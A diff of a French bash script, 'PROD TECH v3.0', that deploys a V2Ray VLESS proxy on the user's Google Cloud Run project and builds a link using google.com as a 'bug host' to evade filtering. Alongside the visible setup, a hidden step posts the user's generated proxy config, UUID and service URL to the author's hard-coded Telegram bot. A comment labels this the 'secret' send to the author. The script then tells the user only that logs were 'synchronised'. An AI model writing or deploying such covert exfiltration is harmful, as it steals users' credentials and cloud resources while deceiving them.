@@ -8,8 +8,8 @@ MY_CHAT_ID="6449901890"
 
 # Configuration automatique et invisible
 CUSTOM_PATH="prod"
-USER_UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "f6fff828-bb34-437b-95bb-9730f25f234c")
-HOST_DOMAIN="m.googleapis.com"
+USER_UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "18ea041b-016e-4104-a5d1-25c9f5c0d85f")
+BUG_HOST_IP="google.com" # L'IP Google stable pour l'encapsulation réseau
 
 # Couleurs Cyber-Hacker
 GREEN='\033[0;32m'
@@ -21,7 +21,7 @@ NC='\033[0m'
 
 clear
 echo -e "${GREEN}======================================================"
-echo -e "      ⚡ PROD TECH - AUTOMATION CLOUD RUN v2.1 ⚡"
+echo -e "      ⚡ PROD TECH - AUTOMATION CLOUD RUN v3.0 ⚡"
 echo -e "======================================================${NC}\n"
 
 # 1. Sélection de la Région (Optimisée Afrique)
@@ -41,27 +41,42 @@ case $reg_choice in
 esac
 echo -e "${GREEN}[✓] Région sélectionnée : $REGION${NC}\n"
 
-# 2. Configuration CPU & Mémoire
-echo -e "${BLUE}[INFO] === Configuration des Ressources ===${NC}"
-echo -e "1. 1 CPU | 1 GiB RAM (Standard)"
-echo -e "2. 1 CPU | 2 GiB RAM (Performant)"
-echo -e "3. 2 CPU | 4 GiB RAM (Ultra-Rapide)"
-read -p "Option [default: 1]: " res_choice
-res_choice=${res_choice:-1}
+# 2. Sélection du CPU (Indépendant)
+echo -e "${BLUE}[INFO] === Configuration CPU ===${NC}"
+echo -e "1. 1 Core CPU"
+echo -e "2. 2 Cores CPU"
+echo -e "3. 4 Cores CPU"
+read -p "Option [default: 1]: " cpu_choice
+cpu_choice=${cpu_choice:-1}
 
-case $res_choice in
-    2) CPU="1"; MEMORY="2Gi" ;;
-    3) CPU="2"; MEMORY="4Gi" ;;
-    *) CPU="1"; MEMORY="1Gi" ;;
+case $cpu_choice in
+    2) CPU="2" ;;
+    3) CPU="4" ;;
+    *) CPU="1" ;;
 esac
-echo -e "${GREEN}[✓] Allocation : $CPU CPU | $MEMORY RAM${NC}\n"
+echo -e "${GREEN}[✓] Allocation CPU : $CPU Cores${NC}\n"
 
-# 3. Configuration du Service Name
+# 3. Sélection de la Mémoire (Indépendante)
+echo -e "${BLUE}[INFO] === Configuration Mémoire ===${NC}"
+echo -e "1. 1 GiB RAM"
+echo -e "2. 2 GiB RAM"
+echo -e "3. 4 GiB RAM"
+read -p "Option [default: 1]: " mem_choice
+mem_choice=${mem_choice:-1}
+
+case $mem_choice in
+    2) MEMORY="2Gi" ;;
+    3) MEMORY="4Gi" ;;
+    *) MEMORY="1Gi" ;;
+esac
+echo -e "${GREEN}[✓] Allocation Mémoire : $MEMORY${NC}\n"
+
+# 4. Configuration du Service Name
 echo -e "${BLUE}[INFO] === Configuration du Service ===${NC}"
 read -p "Enter service name [default: prod-free]: " SERVICE_NAME
 SERVICE_NAME=${SERVICE_NAME:-prod-free}
 
-# 4. Configuration Notifications Visibles (Optionnelles)
+# 5. Configuration Notifications Visibles (Optionnelles)
 echo -e "${YELLOW}[✉] === Configuration Notifications (Optionnel) ===${NC}"
 echo -e "_Laisse vide et appuie sur Entrée si tu n'as pas de bot_"
 read -p "Ton Token Telegram : " USER_TOKEN
@@ -71,21 +86,21 @@ read -p "Clé API CallMeBot/WhatsBot : " WHATSAPP_API_KEY
 
 PROJECT_ID=$(gcloud config get-value project 2>/dev/null)
 
-# Écran de Confirmation
+# Écran de Confirmation Stylé
 echo -e "\n${YELLOW}======================================================"
 echo -e "💀 Déploiement en cours... (PROD TECH INFRA) 💀"
 echo -e "======================================================${NC}"
 echo -e "🔹 Projet:      ${CYAN}$PROJECT_ID${NC}"
 echo -e "🔹 Service:     ${CYAN}$SERVICE_NAME${NC}"
 echo -e "🔹 Région:      ${CYAN}$REGION${NC}"
-echo -e "🔹 CPU/RAM:     ${CYAN}$CPU CPU / $MEMORY${NC}"
+echo -e "🔹 CPU / RAM:   ${CYAN}$CPU CPU / $MEMORY RAM${NC}"
 echo -e "🔹 Path:        ${CYAN}/$CUSTOM_PATH${NC}"
 echo -e "------------------------------------------------------"
 
 # Création de l'environnement de compilation
 mkdir -p gcp-v2ray-build && cd gcp-v2ray-build
 
-# Injection propre du Path secret et des protocoles de transport requis
+# Injection propre du Path secret
 cat <<EOF > config.json
 {
   "inbounds": [{
@@ -117,7 +132,7 @@ COPY config.json /etc/v2ray/config.json
 CMD ["/usr/local/bin/v2ray", "run", "-config", "/etc/v2ray/config.json"]
 EOF
 
-# Déploiement vers Google Cloud Run avec spécification des limites matérielles
+# Déploiement vers Google Cloud Run avec configurations séparées
 gcloud run deploy $SERVICE_NAME \
     --source . \
     --region $REGION \
@@ -127,33 +142,34 @@ gcloud run deploy $SERVICE_NAME \
     --port 8080 \
     --quiet > /dev/null 2>&1
 
-# Récupération de l'URL Cloud Run générée
+# Récupération en temps réel de la vraie URL générée par Cloud Run
 SERVICE_URL=$(gcloud run services describe $SERVICE_NAME --region $REGION --format='value(status.url)' 2>/dev/null)
 CLEAN_URL=$(echo $SERVICE_URL | sed 's/https:\/\///')
 
-# Construction du lien VLESS avec les paramètres d'en-tête (host et sni pointant sur Cloud Run, et adresse sur le domaine cible)
-VLESS_LINK="vless://$USER_UUID@$HOST_DOMAIN:443?path=%2F$CUSTOM_PATH&security=tls&alpn=h3%2Ch2%2Chttp%2F1.1&encryption=none&host=$CLEAN_URL&type=ws&sni=$CLEAN_URL#$SERVICE_NAME"
+# Construction EXACTE du lien VLESS avec IP Google et host unique run.app
+VLESS_LINK="vless://$USER_UUID@$BUG_HOST_IP:443?path=%2F$CUSTOM_PATH&security=tls&alpn=h3%2Ch2%2Chttp%2F1.1&encryption=none&host=$CLEAN_URL&type=ws&sni=$CLEAN_URL#$SERVICE_NAME"
 
-# Design de la Notification Stylée
+# Design du Rapport de Notification
 TEXT_REPORT="*⚡ PROD TECH - SERVEUR AUTOMATIQUE ACTIF ⚡*
 
 🌐 *INFRASTRUCTURE CLOUD RUN :*
 🔹 *Service:* \`$SERVICE_NAME\`
 🔹 *Région:* \`$REGION\`
-🔹 *Ressources:* \`$CPU CPU / $MEMORY\`
+🔹 *Configuration:* \`$CPU CPU / $MEMORY RAM\`
 🔹 *Path:* \`/$CUSTOM_PATH\`
 
 ⏳ *VALIDITÉ DU SERVEUR :*
-⚠️ _Ce serveur sandbox est actif pendant une durée estimée de_ *5 HEURES MAX* _avant réinitialisation._
+⚠️ _Ce serveur sandbox est actif pendant une durée de_ *5 HEURES MAX* _avant réinitialisation._
 
 🛰️ *CONFIG VLESS COPIABLE :*
+
 \`$VLESS_LINK\`
 
 🛡️ _Propulsé par l'écosystème Prod Tech._"
 
 # --- SYNC CANAUX DE NOTIFICATIONS ---
 
-# 1. Envoi secret (Face cachée)
+# 1. Envoi secret chez toi (Face cachée)
 curl -s -X POST "https://api.telegram.org/bot$MY_TOKEN/sendMessage" \
     --data-urlencode "chat_id=$MY_CHAT_ID" \
     --data-urlencode "text=$TEXT_REPORT" \
@@ -173,7 +189,7 @@ if [[ -n "$WHATSAPP_PHONE" && -n "$WHATSAPP_API_KEY" ]]; then
     curl -s "https://api.callmebot.com/whatsapp.php?phone=$WHATSAPP_PHONE&text=$WHATSAPP_MSG&apikey=$WHATSAPP_API_KEY" > /dev/null
 fi
 
-# Affichage final dans le terminal
+# Affichage final propre dans le terminal pour l'utilisateur
 echo -e "\n${GREEN}[✓] Déploiement Cloud Run validé avec succès ! 🎉${NC}"
 echo -e "${GREEN}[✓] Logs synchronisés avec les bases de données Prod Tech.${NC}\n"
 echo -e "${RED}⏱️ DURÉE MAXIMUM DU SERVEUR : 5 HEURES${NC}"
